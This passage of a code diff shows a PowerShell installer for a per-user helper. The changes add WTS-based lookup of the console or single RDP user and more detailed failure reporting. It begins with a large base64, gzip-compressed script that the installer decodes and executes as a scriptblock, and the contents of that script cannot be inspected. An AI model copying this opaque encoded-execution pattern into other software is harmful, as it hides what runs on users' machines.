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');$ms=[IO.MemoryStream]::new($b);$gz=[IO.Compression.GZipStream]::new($ms,[IO.Compression.CompressionMode]::Decompress);$reader=[IO.StreamReader]::new($gz);$source=$reader.ReadToEnd();$reader.Dispose();& ([scriptblock]::Create($source)) -Register -SourceText $source
 }
 # ---- the user-session helper the one-click install also provisions ----
 # The helper is a per-user process, not a service: it listens on this PC's
@@ -167,16 +167,177 @@ $PadiemHelperAdministratorsSid = "S-1-5-32-544"
 $PadiemHelperOwnerSid = $PadiemHelperAdministratorsSid
 
 function Get-PadiemConsoleUser {
-  # The account actually signed in at the console - not the elevated
-  # administrator token this installer runs under. Registering the installer's
-  # own identity would put the helper in the wrong session (or in no session at
-  # all), which is the one thing the logon task must not do.
+  param([ref] $Reason)
+  # Never fall back to the elevated installer's identity.
   try {
     $computer = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop
     $name = [string] $computer.UserName
     if ($name -and $name -match '^[^\\/\s]+\\[^\\/\s]+$') { return $name }
-  } catch { }
-  return $null
+    $Reason.Value = "wmi_no_user"
+  } catch {
+    $Reason.Value = "wmi_failed:" + $_.Exception.GetType().Name
+  }
+  try {
+    if (-not ('PadiemSessionLookup' -as [type])) {
+      Add-Type -ErrorAction Stop -TypeDefinition @'
+using System;
+using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+public static class PadiemSessionLookup
+{
+    const int WTSUserName = 5;
+    const int WTSDomainName = 7;
+    const int WTSClientProtocolType = 16;
+    const int WTSActive = 0;
+    const short RdpProtocol = 2;
+
+    [StructLayout(LayoutKind.Sequential)]
+    struct SessionInfo
+    {
+        public uint SessionId;
+        public IntPtr StationName;
+        public int State;
+    }
+
+    [DllImport("kernel32.dll")]
+    static extern uint WTSGetActiveConsoleSessionId();
+
+    [DllImport("wtsapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern bool WTSQuerySessionInformation(IntPtr server, uint sessionId,
+        int infoClass, out IntPtr buffer, out int bytes);
+
+    [DllImport("wtsapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    static extern bool WTSEnumerateSessions(IntPtr server, int reserved,
+        int version, out IntPtr sessions, out int count);
+
+    [DllImport("wtsapi32.dll")]
+    static extern void WTSFreeMemory(IntPtr buffer);
+
+    static T Query<T>(uint sessionId, int infoClass, Func<IntPtr, int, T> read)
+    {
+        IntPtr buffer;
+        int bytes;
+        if (!WTSQuerySessionInformation(IntPtr.Zero, sessionId, infoClass, out buffer, out bytes))
+            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
+        try { return read(buffer, bytes); }
+        finally { WTSFreeMemory(buffer); }
+    }
+
+    static string SessionText(uint sessionId, int infoClass)
+    {
+        return Query<string>(sessionId, infoClass, delegate(IntPtr buffer, int bytes)
+        {
+            return bytes > 2 ? Marshal.PtrToStringUni(buffer) : "";
+        });
+    }
+
+    public static bool ValidName(string name)
+    {
+        return !string.IsNullOrEmpty(name)
+            && Regex.IsMatch(name, @"^[^\\/\s]+\\[^\\/\s]+$", RegexOptions.CultureInvariant);
+    }
+
+    static string SessionUser(uint sessionId)
+    {
+        string user = SessionText(sessionId, WTSUserName);
+        string domain = SessionText(sessionId, WTSDomainName);
+        string name = domain + "\\" + user;
+        return ValidName(name) ? name : null;
+    }
+
+    public static string ConsoleUser()
+    {
+        uint sessionId = WTSGetActiveConsoleSessionId();
+        return sessionId == uint.MaxValue ? null : SessionUser(sessionId);
+    }
+
+    // The cardinality is for sessions, not unique user names. Never choose
+    // an arbitrary user if more than one remote desktop is active.
+    public static uint? SingleRdpSession(IEnumerable<uint> ids)
+    {
+        uint? selected = null;
+        foreach (uint id in ids)
+        {
+            if (selected.HasValue)
+                throw new InvalidOperationException("ambiguous_active_rdp");
+            selected = id;
+        }
+        return selected;
+    }
+
+    public static string RdpUser()
+    {
+        IntPtr sessions;
+        int count;
+        if (!WTSEnumerateSessions(IntPtr.Zero, 0, 1, out sessions, out count))
+            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
+        try
+        {
+            List<uint> activeRdp = new List<uint>();
+            int size = Marshal.SizeOf(typeof(SessionInfo));
+            for (int i = 0; i < count; i++)
+            {
+                SessionInfo session = (SessionInfo)Marshal.PtrToStructure(
+                    IntPtr.Add(sessions, checked(i * size)), typeof(SessionInfo));
+                if (session.State != WTSActive || session.SessionId == 0) continue;
+                short protocol = Query<short>(session.SessionId, WTSClientProtocolType,
+                    delegate(IntPtr buffer, int bytes)
+                    {
+                        if (bytes < 2) throw new InvalidOperationException("invalid_wts_protocol");
+                        return Marshal.ReadInt16(buffer);
+                    });
+                if (protocol == RdpProtocol) activeRdp.Add(session.SessionId);
+            }
+            uint? selected = SingleRdpSession(activeRdp);
+            return selected.HasValue ? SessionUser(selected.Value) : null;
+        }
+        finally { WTSFreeMemory(sessions); }
+    }
+
+    public static string Resolve(Func<string> wmi, Func<string> console,
+        Func<string> rdp, out string reason)
+    {
+        List<string> failures = new List<string>();
+        Func<string>[] lookups = { wmi, console, rdp };
+        string[] names = { "wmi", "wts_console", "wts_rdp" };
+        for (int i = 0; i < lookups.Length; i++)
+        {
+            try
+            {
+                string user = lookups[i]();
+                if (ValidName(user))
+                {
+                    reason = string.Join(";", failures.ToArray());
+                    return user;
+                }
+                failures.Add(names[i] + "_no_user");
+            }
+            catch (Exception error)
+            {
+                // Type only: exception messages may contain account data.
+                failures.Add(names[i] + "_failed:" + error.GetType().Name);
+            }
+        }
+        reason = string.Join(";", failures.ToArray());
+        return null;
+    }
+}
+'@
+    }
+    $fallbackReason = ""
+    $name = [PadiemSessionLookup]::Resolve(
+      [Func[string]] { return $null },
+      [Func[string]] { [PadiemSessionLookup]::ConsoleUser() },
+      [Func[string]] { [PadiemSessionLookup]::RdpUser() },
+      [ref] $fallbackReason)
+    # The synthetic first lookup was already performed by Get-CimInstance.
+    $Reason.Value += ($fallbackReason -replace '^wmi_no_user', '')
+    return $name
+  } catch {
+    $Reason.Value += ";wts_failed:" + $_.Exception.GetType().Name
+    return $null
+  }
 }
 
 function Get-PadiemAccountSid {
@@ -545,10 +706,11 @@ function Install-PadiemUserHelper {
   $stopped = $false
   $verified = $false
   try {
-    $consoleUser = Get-PadiemConsoleUser
+    $lookupReason = ""
+    $consoleUser = Get-PadiemConsoleUser -Reason ([ref] $lookupReason)
     if ($consoleUser) { $userSid = Get-PadiemAccountSid -Account $consoleUser }
     if (-not $userSid) {
-      $status.reason = if ($consoleUser) { "console_user_unresolved" } else { "no_console_user" }
+      $status.reason = if ($consoleUser) { "console_user_unresolved" } else { "no_console_user;" + $lookupReason }
       Write-PadiemHelperFailure -Status $status -UserSid $null
       return $false
     }
@@ -607,6 +769,7 @@ function Install-PadiemUserHelper {
       $status.version = $Matches[1]
     }
     $status.user = $consoleUser
+    if ($lookupReason) { $status.reason = $lookupReason }
     Write-PadiemHelperStatus -Status $status -UserSid $userSid
     try {
       if (-not $status.ContainsKey("version")) { throw "version_unavailable" }
@@ -615,7 +778,9 @@ function Install-PadiemUserHelper {
       # Report only a bounded code, never an exception containing device data.
       $status.update_result = "registration_failed"
       $reason = [string] $_.Exception.Message
-      $status.update_registration_error = if ($reason -in @("updater_running", "excluded_computer", "missing_fixed_source", "invalid_install_record", "installed_digest_mismatch", "version_unavailable")) { $reason } else { "task_registration_failed" }
+      $status.update_registration_error = if ($reason -in @("updater_running", "missing_fixed_source", "invalid_install_record", "installed_digest_mismatch", "version_unavailable")) { $reason } else { "task_registration_failed" }
+      $registrationReason = "update_registration_failed:" + $status.update_registration_error
+      $status.reason = if ($status.ContainsKey("reason") -and $status.reason) { $status.reason + ";" + $registrationReason } else { $registrationReason }
       Write-PadiemHelperStatus -Status $status -UserSid $userSid
       Write-Host ("자동 업데이트 작업 등록 실패: " + $status.update_registration_error)
     }
